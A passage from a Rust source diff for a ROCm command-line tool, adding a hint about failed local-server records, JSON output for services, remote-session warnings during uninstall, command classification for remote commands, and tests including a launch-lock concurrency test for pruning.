 fn render_install_sdk_dry_run_for_args(paths: &AppPaths, args: &[String]) -> Result<String> {
     let channel = chat_cli_arg_value(args, "--channel").unwrap_or("release");
     let format = chat_cli_arg_value(args, "--format").unwrap_or("wheel");
@@ -15078,21 +15965,25 @@ fn render_install_sdk_dry_run_for_args(paths: &AppPaths, args: &[String]) -> Res
     let version = chat_cli_arg_value(args, "--version").map(str::to_owned);
     let build_date = chat_cli_arg_value(args, "--build-date").map(str::to_owned);
     let selector = therock_install_version_selector(version, build_date)?;
+    let devel = chat_cli_has_flag(args, "--devel");
     // Dry run, so nothing is displaced and the consent gate is never reached;
     // the narrow consent is what this chat surface would pass for a real
     // install, and passing `--yes`'s source here would be a lie waiting to be
     // printed if the preview ever grew a gate.
     Ok(therock::install_sdk(
         paths,
-        channel,
-        format,
-        prefix,
-        selector,
-        None,
-        true,
-        therock::SdkInstallConsent::Preapproved(
-            therock::SdkInstallApprovalSource::ApproveReplacingActiveDefault,
-        ),
+        therock::SdkInstallRequest {
+            channel,
+            format,
+            prefix,
+            version_selector: selector,
+            dry_run: true,
+            include_devel: devel,
+            consent: therock::SdkInstallConsent::Preapproved(
+                therock::SdkInstallApprovalSource::ApproveReplacingActiveDefault,
+            ),
+            ..therock::SdkInstallRequest::default()
+        },
     )?
     .output)
 }
@@ -15782,6 +16673,16 @@ fn append_examine_runtime_state(
             therock::runtime_version_display(&manifest.version)
         );
         let _ = writeln!(output, "  active_runtime_family: {}", manifest.family);
+        // The same fact `rocm runtimes list` reports as `toolchain=`, for the
+        // one runtime that is actually in use. `examine` is where a user looks
+        // when a build fails on a missing `hipcc`, and without this line the
+        // command that exists to answer "what is my ROCm state" could not say
+        // whether the active runtime has a compiler at all.
+        let _ = writeln!(
+            output,
+            "  active_runtime_toolchain: {}",
+            toolchain_state_text(manifest.includes_devel())
+        );
         let mode = if manifest.format == "system" {
             "read-only (system)"
         } else if manifest.read_only {
@@ -15791,12 +16692,12 @@ fn append_examine_runtime_state(
         };
         let _ = writeln!(output, "  active_runtime_mode: {mode}");
     }
-    if let Some(setup_root) = config.setup.therock_venv.as_deref() {
+    if let Some((setup_root, pip_cache_dir)) = setup_runtime_paths(config) {
         let _ = writeln!(output, "  setup_runtime_root: {}", setup_root.display());
         let _ = writeln!(
             output,
             "  setup_runtime_pip_cache_dir: {}",
-            managed_pip_cache_dir(setup_root).display()
+            pip_cache_dir.display()
         );
     }
     let keys = if manifests.is_empty() {
@@ -17132,12 +18033,53 @@ fn log_browser_source_label(source: &str, show_file_locations: bool) -> String {
     }
 }
 
+/// Tell the default (`!all`) view about local server records it is hiding.
+///
+/// The default view lists only live servers, so a host whose serves all failed
+/// saw an empty list with no hint that anything was recorded. Name the command
+/// that lists them, the one that reads a specific log (with a real id, so that
+/// line can be pasted as-is), and the one that deletes them.
+///
+/// `prune` is named last and without qualification on purpose. Every record
+/// carries an unrotated engine log, so on a host that has served real models
+/// this block is pointing at the only thing on disk the user can get back — and
+/// the other two lines only ever let them *look*. Nothing is said here about
+/// how `prune` decides what to remove: that is its own command's output, and
+/// its behaviour is under change on a sibling branch.
+fn write_past_attempts_hint(output: &mut String, past_attempts: usize, newest_id: Option<&str>) {
+    if past_attempts == 0 {
+        return;
+    }
+    let _ = writeln!(output);
+    let _ = writeln!(
+        output,
+        "Past attempts: {past_attempts} local server record(s) that are no longer running."
+    );
+    let _ = writeln!(output, "  See them: rocm services list --all");
+    if let Some(id) = newest_id {
+        let _ = writeln!(output, "  Read the newest: rocm services logs {id}");
+    }
+    let _ = writeln!(output, "  Reclaim the space: rocm services prune");
+}
+
 pub(crate) fn render_services_text(paths: &AppPaths, all: bool) -> Result<String> {
-    let records = load_managed_services(paths)?
+    // Counts describe the WHOLE registry, not the rows this view keeps. The
+    // default view hides records that are not live, and counting the filtered
+    // list made the header say "none ready" on a host whose only local servers
+    // had failed - the records were on disk and nothing mentioned them. Rows
+    // stay filtered; only the header and the hint below see everything.
+    let all_records = load_managed_services(paths)?;
+    let counts = managed_service_sidebar_counts(&all_records);
+    // `load_managed_services` sorts newest-first, so the first record that is
+    // not live is the newest one - the id worth putting in a pasteable hint.
+    let newest_past_attempt = all_records
+        .iter()
+        .find(|record| !managed_service_is_live(record))
+        .map(|record| record.service_id.clone());
+    let records = all_records
         .into_iter()
         .filter(|record| all || managed_service_is_live(record))
         .collect::<Vec<_>>();
-    let counts = managed_service_sidebar_counts(&records);
     let mut output = String::new();
     let _ = writeln!(output, "Local Servers");
     let _ = writeln!(output);
@@ -17149,6 +18091,19 @@ pub(crate) fn render_services_text(paths: &AppPaths, all: bool) -> Result<String
         } else {
             writeln!(output, "No local servers are running.")
         };
+        // Gate the separator on the same condition as the hint, not just on
+        // `!all`: `write_past_attempts_hint` early-returns at zero, so a host
+        // that has never served would otherwise gain a blank line between "No
+        // local servers are running." and the next line - a visible change to
+        // the one output this PR is not meant to touch.
+        if !all && counts.past_attempts > 0 {
+            write_past_attempts_hint(
+                &mut output,
+                counts.past_attempts,
+                newest_past_attempt.as_deref(),
+            );
+            let _ = writeln!(output);
+        }
         let _ = writeln!(
             output,
             "Start one with `rocm serve <model> --managed`, or run `rocm` and choose Serve."
@@ -17181,6 +18136,34 @@ pub(crate) fn render_services_text(paths: &AppPaths, all: bool) -> Result<String
             );
         }
     }
+    // A host can have one server ready and three failed, so the populated
+    // branch needs the hint just as much as the empty one.
+    if !all {
+        write_past_attempts_hint(
+            &mut output,
+            counts.past_attempts,
+            newest_past_attempt.as_deref(),
+        );
+    }
+    Ok(output)
+}
+
+/// The machine-readable counterpart to [`render_services_text`].
+///
+/// Applies the same liveness filter as the text form so `--json` and the table
+/// agree on which services they consider current — the two must not disagree
+/// about what is running. Emits the `ManagedServiceRecord`s verbatim rather than
+/// a bespoke projection: `rocm remote` deserializes them back into the same type
+/// on the other side of its control channel, so any field this dropped would be
+/// a field the remote orchestration could never see.
+pub(crate) fn render_services_json(paths: &AppPaths, all: bool) -> Result<String> {
+    let records = load_managed_services(paths)?
+        .into_iter()
+        .filter(|record| all || managed_service_is_live(record))
+        .collect::<Vec<_>>();
+    let mut output = serde_json::to_string_pretty(&records)
+        .context("failed to serialize the managed service records as JSON")?;
+    output.push('\n');
     Ok(output)
 }
 
@@ -17554,7 +18537,11 @@ fn restart_internal_managed_service(
     let preserved_endpoint_key = endpoint_keys::endpoint_api_key(paths, service_id);
     // Checked before the stop, so a refused restart leaves a running service
     // running instead of stopping it and then failing to bring it back.
-    ensure_public_service_has_endpoint_key(&record.host, preserved_endpoint_key.is_some())?;
+    ensure_public_service_has_endpoint_key(
+        &record.host,
+        preserved_endpoint_key.is_some(),
+        record.requires_api_key,
+    )?;
     let _ = stop_internal_managed_service(paths, service_id);
     if let Some(key) = preserved_endpoint_key.as_deref() {
         endpoint_keys::store_endpoint_api_key(paths, service_id, key)?;
@@ -17906,6 +18893,7 @@ fn apply_runtime_update(
             &source.family,
             plan.device_target.as_deref(),
             plan.source_layout_generation.as_deref(),
+            source.includes_devel(),
             true,
             activate,
         )?;
@@ -17928,6 +18916,9 @@ fn apply_runtime_update(
         &source.family,
         plan.device_target.as_deref(),
         plan.source_layout_generation.as_deref(),
+        // Reinstall what the user originally chose rather than silently
+        // adding or dropping the compiler toolchain on update.
+        source.includes_devel(),
         false,
         activate,
     )?;
@@ -18611,12 +19602,29 @@ fn refresh_managed_service_runtime_liveness(
     settled_pending_stop
 }
 
+/// One-line header for the local-servers views.
+///
+/// Records that are neither ready nor starting used to be invisible here, so a
+/// host with three failed servers and nothing live read "none ready" - true of
+/// the live set, misleading about what is on disk. They now get their own
+/// clause. The ready/starting wording is unchanged, so a header with no past
+/// attempts reads exactly as before; one with past attempts gains a third
+/// clause ("1 ready, 1 starting, 1 not running").
 fn local_server_sidebar_status(counts: &ManagedServiceSidebarCounts) -> String {
-    match (counts.ready, counts.starting) {
-        (0, 0) => "none ready".to_owned(),
-        (ready, 0) => format!("{ready} ready"),
-        (0, starting) => format!("{starting} starting"),
-        (ready, starting) => format!("{ready} ready, {starting} starting"),
+    let mut parts = Vec::new();
+    if counts.ready > 0 {
+        parts.push(format!("{} ready", counts.ready));
+    }
+    if counts.starting > 0 {
+        parts.push(format!("{} starting", counts.starting));
+    }
+    if counts.past_attempts > 0 {
+        parts.push(format!("{} not running", counts.past_attempts));
+    }
+    if parts.is_empty() {
+        "none ready".to_owned()
+    } else {
+        parts.join(", ")
     }
 }
 
@@ -19835,6 +20843,45 @@ fn build_uninstall_plan(paths: &AppPaths, options: &UninstallOptions) -> Result<
         ));
     }
 
+    // Remote sessions are worse than local ones to drop silently. The model runs
+    // on someone else's machine and its endpoint is published there, so removing
+    // the record here does not stop either — it only destroys the last thing that
+    // knew they existed. Name them and the command that tears them down properly.
+    //
+    // A read that fails is reported, not defaulted away. `load_all` already warns
+    // past an individual unreadable record and keeps going, so an `Err` here is a
+    // directory-level I/O failure, and a missing directory is `Ok`. Taking the
+    // default would state "there are none" on the one path where we do not know —
+    // and this plan goes on to delete the data directory those records live in,
+    // so the warning that something is still published elsewhere would be lost at
+    // exactly the moment it was the last copy.
+    let remote_sessions = match remote::session::load_all(paths) {
+        Ok(sessions) => sessions,
+        Err(error) => {
+            plan.warnings.push(format!(
+                "could not read the remote session records under {}: {error:#}\n\
+                 This pass cannot tell whether models are still running on other machines with \
+                 their endpoints published. Check with `rocm remote status` before continuing.",
+                paths.remote_sessions_dir().display()
+            ));
+            Vec::new()
+        }
+    };
+    if !remote_sessions.is_empty() {
+        plan.warnings.push(format!(
+            "{} remote session record(s) exist under {}; their models keep running on the \
+             remote machines and their endpoints stay published. Removing these records only \
+             loses track of them — run `rocm remote stop <session>` for each first: {}",
+            remote_sessions.len(),
+            paths.remote_sessions_dir().display(),
+            remote_sessions
+                .iter()
+                .map(|session| session.session_id.as_str())
+                .collect::<Vec<_>>()
+                .join(", ")
+        ));
+    }
+
     plan.actions
         .sort_by(|left, right| left.path.cmp(&right.path));
     plan.actions.dedup_by(|left, right| left.path == right.path);
@@ -20518,6 +21565,14 @@ fn parse_gpu_indices_arg(value: Option<&str>) -> Result<Vec<u32>> {
 /// unrelated concurrent serve can wait on the order of seconds. `FileLock`
 /// blocks without a timeout; the slow first-use install is deliberately kept
 /// outside this section so it is not also serialized.
+///
+/// That span is relied on by a second caller: because the guard outlives both
+/// `store_endpoint_api_key` and the first `record.write()`, it also covers the
+/// interval in which a launch's 0600 endpoint key sits on disk with no manifest
+/// beside it. [`prune_managed_service_records`] acquires the same lock so its
+/// leftover sweep cannot read the directory in that state. Shortening the
+/// guard's life — releasing it before the record is persisted — would silently
+/// reopen that window as well as the GPU double-booking one.
 fn select_gpu_indices_under_launch_lock(
     paths: &AppPaths,
     cpu_only: bool,
@@ -21478,6 +22533,7 @@ fn treat_as_natural_language(args: &[String]) -> bool {
         "comfyui",
         "comfy",
         "services",
+        "remote",
         "automations",
         "config",
         "logs",
@@ -25498,6 +26554,17 @@ model recipes
                 "old-runtime".to_owned(),
                 "--dry-run".to_owned(),
             ],
+            // Must agree with the daemon's `ensure_rocm_command_is_read_only`.
+            // Its comment claims the two are mirrored, and nothing enforced
+            // that — the arm was added there and not here, and the classifiers
+            // disagreed until a reviewer noticed.
+            vec!["remote".to_owned(), "targets".to_owned()],
+            vec![
+                "remote".to_owned(),
+                "doctor".to_owned(),
+                "gpu-box".to_owned(),
+            ],
+            vec!["remote".to_owned(), "status".to_owned()],
         ];
         for args in read_only {
             let action = chat_rocm_command_action_from_args(args.clone())
@@ -25508,32 +26575,67 @@ model recipes
             );
         }
 
+        // Paired with whether the command has a `--yes` to inject. The flag
+        // exists to keep a consent prompt from hanging a null-stdin spawn, so
+        // the demand only makes sense for commands that would prompt — and
+        // injecting it where clap defines no such flag would make the spawn fail
+        // to parse rather than succeed unattended.
         let mutating = [
-            vec!["update".to_owned(), "--apply".to_owned()],
-            vec!["comfyui".to_owned(), "install".to_owned()],
-            vec!["comfyui".to_owned(), "start".to_owned()],
-            vec!["comfyui".to_owned(), "stop".to_owned()],
-            vec!["uninstall".to_owned()],
-            vec!["setup".to_owned(), "reset".to_owned()],
-            vec![
-                "runtimes".to_owned(),
-                "uninstall".to_owned(),
-                "old-runtime".to_owned(),
-            ],
-            vec![
-                "runtimes".to_owned(),
-                "remove".to_owned(),
-                "old-runtime".to_owned(),
-            ],
+            (vec!["update".to_owned(), "--apply".to_owned()], true),
+            // These start, publish or tear down on another machine. They take no
+            // `--yes` because they never prompt: consent is the approval step
+            // itself, and every destructive choice they make is already settled
+            // by an explicit flag (`remote stop --force`). Give any of them an
+            // interactive prompt and it needs a consent flag here too.
+            (
+                vec![
+                    "remote".to_owned(),
+                    "serve".to_owned(),
+                    "gpu-box".to_owned(),
+                    "m".to_owned(),
+                ],
+                false,
+            ),
+            (
+                vec!["remote".to_owned(), "attach".to_owned(), "sess".to_owned()],
+                false,
+            ),
+            (
+                vec!["remote".to_owned(), "stop".to_owned(), "sess".to_owned()],
+                false,
+            ),
+            (vec!["comfyui".to_owned(), "install".to_owned()], true),
+            (vec!["comfyui".to_owned(), "start".to_owned()], true),
+            (vec!["comfyui".to_owned(), "stop".to_owned()], true),
+            (vec!["uninstall".to_owned()], true),
+            (vec!["setup".to_owned(), "reset".to_owned()], true),
+            (
+                vec![
+                    "runtimes".to_owned(),
+                    "uninstall".to_owned(),
+                    "old-runtime".to_owned(),
+                ],
+                true,
+            ),
+            (
+                vec![
+                    "runtimes".to_owned(),
+                    "remove".to_owned(),
+                    "old-runtime".to_owned(),
+                ],
+                true,
+            ),
         ];
-        for args in mutating {
+        for (args, expects_yes) in mutating {
             let action = chat_rocm_command_action_from_args(args.clone())
                 .unwrap_or_else(|err| panic!("{args:?} should classify: {err}"));
             match &action {
                 ChatRocmCommandAction::Approval { args, .. } => {
-                    assert!(
+                    assert_eq!(
                         args.iter().any(|arg| arg == "--yes"),
-                        "{args:?} should have --yes injected for the approval path"
+                        expects_yes,
+                        "{args:?} disagrees with whether the approval path should \
+                         carry --yes"
                     );
                 }
                 other @ ChatRocmCommandAction::ReadOnly(_) => {
@@ -27193,14 +28295,322 @@ install therock";
         let _ = fs::remove_dir_all(root);
 
         assert!(rendered.contains("Local Servers"));
-        assert!(rendered.contains("Status: 1 ready, 1 starting"));
-        assert!(!rendered.contains("Past attempts"));
+        // The header counts the whole registry, so the hidden `failed` record
+        // is admitted to rather than silently dropped from the default view.
+        assert!(
+            rendered.contains("Status: 1 ready, 1 starting, 1 not running"),
+            "{rendered}"
+        );
+        assert!(
+            rendered
+                .contains("Past attempts: 1 local server record(s) that are no longer running."),
+            "{rendered}"
+        );
+        assert!(
+            rendered.contains("  Read the newest: rocm services logs svc-failed"),
+            "{rendered}"
+        );
         assert!(rendered.contains("- svc-ready"));
         assert!(rendered.contains("  stop: rocm services stop svc-ready --yes"));
         assert!(!rendered.contains("- svc-failed"));
         assert!(all.contains("- svc-failed"));
         assert!(all.contains("  restart: rocm services restart svc-failed --yes"));
         assert!(!rendered.contains("running servers"));
+        Ok(())
+    }
+
+    /// The default view lists only live servers. The counts used to be taken
+    /// from that already-filtered list, so a host whose local servers had all
+    /// failed was told "none ready" and shown an empty list - the records were
+    /// on disk, unmentioned, and nothing on screen said how to reach them.
+    /// Counts now come from the unfiltered registry; the rows stay filtered.
+    #[test]
+    fn render_services_text_surfaces_records_the_default_view_hides() -> Result<()> {
+        let (root, paths) = test_paths("services-past-attempts-only");
+        paths.ensure()?;
+        // Not live, so `refresh_managed_service_runtime_liveness` returns before
+        // any endpoint probe or pid check: no network, no timing dependence.
+        for (service_id, created_at) in [("svc-older", 1_000_u128), ("svc-newest", 2_000_u128)] {
+            let mut record = ManagedServiceRecord::new(
+                &paths,
+                service_id,
+                "vllm",
+                "qwen",
+                "Qwen/Qwen3.5",
+                "127.0.0.1",
+                11500,
+                "managed",
+                999_999_999,
+                None,
+                None,
+                None,
+            );
+            record.status = "failed".to_owned();
+            record.created_at_unix_ms = created_at;
+            record.write()?;
+        }
+
+        let rendered = render_services_text(&paths, false)?;
+        let all = render_services_text(&paths, true)?;
+        let _ = fs::remove_dir_all(root);
+
+        assert!(rendered.contains("Status: 2 not running"), "{rendered}");
+        assert!(!rendered.contains("none ready"), "{rendered}");
+        assert!(
+            rendered.contains("No local servers are running."),
+            "{rendered}"
+        );
+        assert!(
+            rendered
+                .contains("Past attempts: 2 local server record(s) that are no longer running."),
+            "{rendered}"
+        );
+        assert!(
+            rendered.contains("  See them: rocm services list --all"),
+            "{rendered}"
+        );
+        // A real id, newest first, so the line can be pasted as-is.
+        assert!(
+            rendered.contains("  Read the newest: rocm services logs svc-newest"),
+            "{rendered}"
+        );
+        // The other two lines only let the user look. Each record keeps an
+        // unrotated engine log, so `prune` is the only line here that gets any
+        // of that space back - without it the block is a dead end on exactly
+        // the host that needs it most.
+        assert!(
+            rendered.contains("  Reclaim the space: rocm services prune"),
+            "{rendered}"
+        );
+        // The `--all` header is fixed by the same change; it lists the rows, so
+        // it does not repeat the pointer.
+        assert!(all.contains("Status: 2 not running"), "{all}");
+        assert!(all.contains("- svc-newest"), "{all}");
+        assert!(!all.contains("Past attempts:"), "{all}");
+        Ok(())
+    }
+
+    /// The host this change is NOT meant to touch: nothing has ever been served,
+    /// so there is no record to point at and the output must read exactly as it
+    /// did before. Every other test here plants at least one record, so without
+    /// this one the zero case has no coverage at all - and it is the case the
+    /// hint's separator regressed, by printing a blank line the old output never
+    /// had between "No local servers are running." and the next line.
+    #[test]
+    fn render_services_text_leaves_a_host_that_never_served_untouched() -> Result<()> {
+        let (root, paths) = test_paths("services-never-served");
+        paths.ensure()?;
+
+        let rendered = render_services_text(&paths, false)?;
+        let _ = fs::remove_dir_all(root);
+
+        assert_eq!(
+            rendered,
+            "Local Servers\n\
+             \n\
+             Status: none ready\n\
+             \n\
+             No local servers are running.\n\
+             Start one with `rocm serve <model> --managed`, or run `rocm` and choose Serve.\n",
+            "{rendered}"
+        );
+        Ok(())
+    }
+
+    /// A host can have one server running and several that failed, so the
+    /// populated branch of the default view needs the same pointer as the empty
+    /// one - the failed records are hidden there too.
+    #[test]
+    fn render_services_text_points_at_past_attempts_beside_a_live_server() -> Result<()> {
+        let (root, paths) = test_paths("services-past-attempts-mixed");
+        paths.ensure()?;
+        let current_pid = std::process::id();
+        // `starting` skips the endpoint probe and this process is a
+        // guaranteed-live pid, so the record stays live without any network.
+        let mut live = ManagedServiceRecord::new(
+            &paths,
+            "svc-live",
+            "vllm",
+            "qwen",
+            "Qwen/Qwen3.5",
+            "127.0.0.1",
+            11501,
+            "managed",
+            current_pid,
+            None,
+            None,
+            None,
+        );
+        live.status = "starting".to_owned();
+        live.engine_pid = Some(current_pid);
+        live.created_at_unix_ms = 3_000;
+        live.write()?;
+        for (service_id, created_at) in [
+            ("svc-failed-older", 1_000_u128),
+            ("svc-failed-newest", 2_000_u128),
+        ] {
+            let mut record = ManagedServiceRecord::new(
+                &paths,
+                service_id,
+                "vllm",
+                "qwen",
+                "Qwen/Qwen3.5",
+                "127.0.0.1",
+                11502,
+                "managed",
+                999_999_999,
+                None,
+                None,
+                None,
+            );
+            record.status = "failed".to_owned();
+            record.created_at_unix_ms = created_at;
+            record.write()?;
+        }
+
+        let rendered = render_services_text(&paths, false)?;
+        let _ = fs::remove_dir_all(root);
+
+        assert!(
+            rendered.contains("Status: 1 starting, 2 not running"),
+            "{rendered}"
+        );
+        // Rows stay filtered: only the live server is listed.
+        assert!(rendered.contains("- svc-live"), "{rendered}");
+        assert!(!rendered.contains("- svc-failed-newest"), "{rendered}");
+        assert!(
+            rendered
+                .contains("Past attempts: 2 local server record(s) that are no longer running."),
+            "{rendered}"
+        );
+        assert!(
+            rendered.contains("  See them: rocm services list --all"),
+            "{rendered}"
+        );
+        assert!(
+            rendered.contains("  Read the newest: rocm services logs svc-failed-newest"),
+            "{rendered}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn services_json_round_trips_and_applies_the_same_liveness_filter_as_the_table() -> Result<()> {
+        // This JSON is a contract, not a convenience: `rocm remote` parses it
+        // back over its control channel to learn which service a remote serve
+        // just started. Two things have to hold — every record survives the
+        // round trip, and `--json` agrees with the table about what is live. If
+        // they disagreed, the remote orchestration would act on a different set
+        // of services than the operator sees.
+        let (root, paths) = test_paths("services-json");
+        paths.ensure()?;
+        let current_pid = std::process::id();
+        for (service_id, status, port) in [
+            ("svc-live", "starting", 11440_u16),
+            ("svc-past", "failed", 11441_u16),
+        ] {
+            let mut record = ManagedServiceRecord::new(
+                &paths,
+                service_id,
+                "vllm",
+                "qwen",
+                "Qwen/Qwen3.5",
+                "127.0.0.1",
+                port,
+                "managed",
+                current_pid,
+                Some("therock-release".to_owned()),
+                None,
+                Some("gpu_required".to_owned()),
+            );
+            record.status = status.to_owned();
+            record.write()?;
+        }
+
+        let live = render_services_json(&paths, false)?;
+        let every = render_services_json(&paths, true)?;
+        let _ = fs::remove_dir_all(root);
+
+        let live: Vec<ManagedServiceRecord> = serde_json::from_str(&live)?;
+        let every: Vec<ManagedServiceRecord> = serde_json::from_str(&every)?;
+
+        assert_eq!(
+            live.iter()
+                .map(|r| r.service_id.as_str())
+                .collect::<Vec<_>>(),
+            vec!["svc-live"],
+            "the default listing must hide past attempts, exactly as the table does"
+        );
+        let mut every_ids = every
+            .iter()
+            .map(|r| r.service_id.as_str())
+            .collect::<Vec<_>>();
+        every_ids.sort_unstable();
+        assert_eq!(every_ids, vec!["svc-live", "svc-past"]);
+
+        // The fields remote orchestration actually reads must survive intact.
+        let record = &live[0];
+        assert_eq!(record.port, 11440);
+        assert_eq!(record.status, "starting");
+        // Note for remote orchestration: the recorded endpoint is already the
+        // OpenAI-compatible base, `/v1` suffix included — not a bare origin.
+        assert_eq!(record.endpoint_url, "http://127.0.0.1:11440/v1");
+        assert_eq!(record.canonical_model_id, "Qwen/Qwen3.5");
+        Ok(())
+    }
+
+    #[test]
+    fn service_records_tolerate_unknown_fields_but_not_missing_required_ones() -> Result<()> {
+        // A remote may run a different CLI version than the machine driving it.
+        // Newer fields it emits must not break an older parser, or a version skew
+        // turns every remote command into a parse error; a genuinely absent
+        // required field must still fail, and name itself when it does.
+        // Built from a real record rather than hand-written JSON, so the fixture
+        // cannot drift out of step with the struct and quietly stop testing the
+        // thing it claims to.
+        let (root, paths) = test_paths("services-json-contract");
+        paths.ensure()?;
+        let record = ManagedServiceRecord::new(
+            &paths,
+            "svc-a",
+            "vllm",
+            "qwen",
+            "Qwen/Qwen3.5",
+            "127.0.0.1",
+            11440,
+            "managed",
+            4242,
+            None,
+            None,
+            None,
+        );
+        let mut value = serde_json::to_value(&record)?;
+        let _ = fs::remove_dir_all(root);
+        let fields = value
+            .as_object_mut()
+            .expect("a service record serializes as a JSON object");
+
+        fields.insert(
+            "a_field_from_a_newer_release".to_owned(),
+            serde_json::Value::Bool(true),
+        );
+        let parsed: ManagedServiceRecord = serde_json::from_value(value.clone())
+            .context("a newer remote's extra fields must not break an older parser")?;
+        assert_eq!(parsed.service_id, "svc-a");
+        assert_eq!(parsed.port, 11440);
+
+        value
+            .as_object_mut()
+            .expect("still an object")
+            .remove("port")
+            .expect("port was present before removal");
+        let error = serde_json::from_value::<ManagedServiceRecord>(value)
+            .expect_err("a missing required field must be rejected, not defaulted")
+            .to_string();
+        assert!(
+            error.contains("port"),
+            "the error should name the missing field, got: {error}"
+        );
         Ok(())
     }
 
@@ -27232,6 +28642,11 @@ install therock";
         let _ = fs::remove_dir_all(root);
 
         assert!(rendered.contains("No local servers are running."));
+        // The transition this test is named for reaches the header too: once the
+        // record is demoted it is a past attempt, so the header says so instead
+        // of the old "none ready" - which described the live set correctly and
+        // the disk misleadingly.
+        assert!(rendered.contains("Status: 1 not running"), "{rendered}");
         assert!(all.contains("- svc-stale-ready"));
         assert!(all.contains("  status: stopped"));
         assert_eq!(reloaded.status, "stopped");
@@ -27242,6 +28657,27 @@ install therock";
     /// endpoint key beside the manifest in `services_dir`, and the engine state
     /// file under `<data>/engines/<engine>/state/`.
     fn plant_service_record(
+        paths: &AppPaths,
+        service_id: &str,
+        status: &str,
+        supervisor_pid: u32,
+    ) -> Result<ManagedServiceRecord> {
+        let record =
+            plant_service_record_without_its_key(paths, service_id, status, supervisor_pid)?;
+        endpoint_keys::store_endpoint_api_key(paths, service_id, "test-key")?;
+        Ok(record)
+    }
+
+    /// Everything [`plant_service_record`] writes *except* the 0600 endpoint
+    /// key: the manifest, the log, and the engine state file.
+    ///
+    /// Split out for the launch-lock test below, which writes the key itself —
+    /// as `serve` does, before the record — and then has to publish the record
+    /// without touching the key again. Planting the key a second time there
+    /// would re-create whatever `prune` had already deleted, turning that test's
+    /// key assertions into assertions about this helper: they would hold whether
+    /// or not the sweep had swept.
+    fn plant_service_record_without_its_key(
         paths: &AppPaths,
         service_id: &str,
         status: &str,
@@ -27277,7 +28713,6 @@ install therock";
             &record.engine_state_path,
             serde_json::to_vec(&serde_json::json!({ "status": status }))?,
         )?;
-        endpoint_keys::store_endpoint_api_key(paths, service_id, "test-key")?;
         Ok(record)
     }
 
@@ -27489,6 +28924,135 @@ install therock";
         assert!(!key_exists, "the orphaned endpoint key must be swept");
         assert_eq!(outcome.removed_records, 0);
         assert_eq!(outcome.removed_files, 3);
+        Ok(())
+    }
+
+    /// The window the launch lock exists to close here: `serve` writes
+    /// the 0600 endpoint key *before* the first manifest, so between those two
+    /// writes a live server's key has no `<id>.json` beside it — the exact shape
+    /// the sweep calls a leftover, and `--any-age` leaves no age gate to hide it
+    /// behind. `serve` holds the managed-launch lock across the whole of that
+    /// interval, so the fix is for `prune` to acquire it too.
+    ///
+    /// Shape of the test, since `FileLock::acquire` blocks with no `try_`
+    /// variant and calling `prune` on the thread that holds the lock would
+    /// simply deadlock: the main thread stands in for the launch and holds the
+    /// lock with only the key written, a second thread runs the real
+    /// `--any-age --yes` argv, and the main thread then does what the launch
+    /// does next — writes the record — *before* releasing. So the sweep sees the
+    /// directory only in its published state.
+    ///
+    /// Two independent assertions each fail on their own if `prune` stops
+    /// acquiring the lock: the negative wait (prune returns while the lock is
+    /// held, so it never waited for it) and the endpoint key (prune scans before
+    /// the record lands and deletes it). The negative wait is reported first
+    /// only because it names the cause; it is not load-bearing on its own, so
+    /// deleting it as "timing-sensitive" still leaves a pure filesystem fact
+    /// behind it. For that second assertion to mean anything, the record has to
+    /// be published *without* rewriting the key — hence
+    /// [`plant_service_record_without_its_key`] below rather than the full
+    /// planter. The negative wait in turn cannot pass vacuously: the worker
+    /// physically cannot report completion without first holding the lock the
+    /// main thread has.
+    #[test]
+    fn services_prune_waits_for_the_managed_launch_lock_before_sweeping() -> Result<()> {
+        use std::sync::mpsc;
+
+        /// Long enough that a `prune` over an all-but-empty data dir would have
+        /// finished many times over, short enough to keep the suite quick. Only
+        /// ever compared against "did not finish", so a slow machine makes this
+        /// more conclusive, never flakier.
+        const WAIT_PROOF: Duration = Duration::from_millis(500);
+        const ID: &str = "svc-launching";
+
+        let (root, paths) = test_paths("services-prune-launch-lock");
+        paths.ensure()?;
+        // Write 1 of 2, byte for byte as `serve` does it at the top of the
+        // managed path. No manifest yet: `spawn_managed_engine_child` has not
+        // reached `record.write()`.
+        endpoint_keys::store_endpoint_api_key(&paths, ID, "live-secret")?;
+        assert!(
+            !paths.service_manifest_path(ID).exists(),
+            "premise: the manifest must not be written yet"
+        );
+        let launch_lock = rocm_core::FileLock::acquire(paths.managed_launch_lock_path())?;
+
+        let (started_tx, started_rx) = mpsc::channel();
+        let (done_tx, done_rx) = mpsc::channel();
+        let (waited, published, finished) = std::thread::scope(|scope| {
+            scope.spawn(|| {
+                started_tx.send(()).expect("signal about to prune");
+                let outcome =
+                    parse_services_prune_args(&["rocm", "services", "prune", "--any-age", "--yes"])
+                        .and_then(|(hours, dry_run, yes)| {
+                            prune_managed_service_records(&paths, hours, dry_run, yes)
+                        });
+                let _ = done_tx.send(
+                    outcome
+                        .map(|outcome| (outcome.removed_files, outcome.skipped_live, outcome.text))
+                        .map_err(|error| error.to_string()),
+                );
+            });
+            // The worker is running before the negative check below, so that
+            // check is about the lock and not about scheduling latency.
+            started_rx
+                .recv_timeout(Duration::from_secs(10))
+                .expect("prune thread started");
+            let early = done_rx.recv_timeout(WAIT_PROOF);
+            let waited = early.is_err();
+            // Write 2 of 2, still under the lock: the launch publishes its
+            // record, and the key stops looking like a leftover. `serve` does
+            // this at `record.write()`, well before it drops the guard.
+            // Only the record: the key was written above, by the launch, and
+            // must not be re-planted here. `plant_service_record` would rewrite
+            // it, and a rewritten key is present at the end of the test whether
+            // or not the sweep deleted it — which is exactly how the two key
+            // assertions below would stop being tripwires.
+            let published =
+                plant_service_record_without_its_key(&paths, ID, "starting", std::process::id())
+                    .map(|_| ());
+            // Nothing above this line may panic: the worker is blocked on this
+            // guard, and `scope` would join it forever.
+            drop(launch_lock);
+            let finished = match early {
+                Ok(finished) => finished,
+                Err(_) => done_rx
+                    .recv_timeout(Duration::from_mins(1))
+                    .expect("prune completes once the launch lock is released"),
+            };
+            (waited, published, finished)
+        });
+        let key_exists = endpoint_keys::endpoint_key_file_path(&paths, ID).exists();
+        let key_value = endpoint_keys::endpoint_api_key(&paths, ID);
+        let _ = fs::remove_dir_all(&root);
+
+        published.context("failed to publish the launch's record under the lock")?;
+        assert!(
+            waited,
+            "prune finished while the managed-launch lock was held, so it never \
+             acquired it — a launch between its key write and its record write \
+             is still exposed:\n{finished:?}"
+        );
+        let (removed_files, skipped_live, text) =
+            finished.map_err(|error| anyhow::anyhow!("prune failed: {error}"))?;
+        assert!(
+            key_exists,
+            "the starting server's endpoint key must survive a concurrent \
+             --any-age prune:\n{text}"
+        );
+        assert_eq!(
